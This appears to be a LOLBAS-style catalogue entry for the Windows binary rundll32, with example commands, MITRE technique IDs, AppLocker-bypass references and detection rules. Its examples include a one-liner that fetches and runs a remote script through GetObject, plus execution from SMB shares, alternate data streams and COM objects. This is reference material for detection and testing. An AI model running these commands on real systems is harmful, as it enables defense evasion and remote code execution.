---
id: windows-execution-rundll32
namespace: windows:execution:rundll32
name: rundll32
description: 'Used by Windows to execute dll files Located at: C:\Windows\System32\rundll32.exe; C:\Windows\SysWOW64\rundll32.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
- system.file.alternate-data-stream
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - filesystem_write
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- rundll32
parameters: []
features: []
execution:
  template: rundll32
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute. (Execute DLL file)
  command: rundll32.exe {PATH},EntryPoint
- description: Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute. (Execute DLL from SMB share.)
  command: rundll32.exe {PATH_SMB:.dll},EntryPoint
- description: Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script. (Execute code from Internet)
  command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{REMOTEURL}")
- description: Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS). (Execute code from alternate data stream)
  command: rundll32 "{PATH}:ADSDLL.dll",DllMain
- description: Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID. (Execute a DLL/EXE COM server payload or ScriptletURL code.)
  command: rundll32.exe -sta {CLSID}
references:
- label: ''
  url: https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
- label: AppLocker_Bypass_Techniques.html#menu_index_7
  url: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7
- label: ''
  url: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
- label: ''
  url: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
- label: ''
  url: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
- label: obfus.md
  url: https://github.com/sailay1996/expl-bin/blob/master/obfus.md
- label: rundll32.md
  url: https://github.com/sailay1996/misc-bin/blob/master/rundll32.md
- label: a-deep-dive-into-rundll32-exe-642344b41e90
  url: https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90
- label: rundll32-the-infamous-proxy-for-executing-maliciou
  url: https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code
techniques:
- execution
- defense-evasion
mitre_ids:
- T1218.011
- T1564.004
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_unusual_network_connection_via_rundll32.toml
- type: ioc
  description: Outbount Internet/network connections made from rundll32
- type: ioc
  description: Suspicious use of cmdline flags such as -sta
install:
- method: choco
  package_name: rundll32
  commands:
  - choco install rundll32
---


# rundll32

rundll32 is a Windows LOLBin. Used by Windows to execute dll files Located at: C:\Windows\System32\rundll32.exe; C:\Windows\SysWOW64\rundll32.exe.
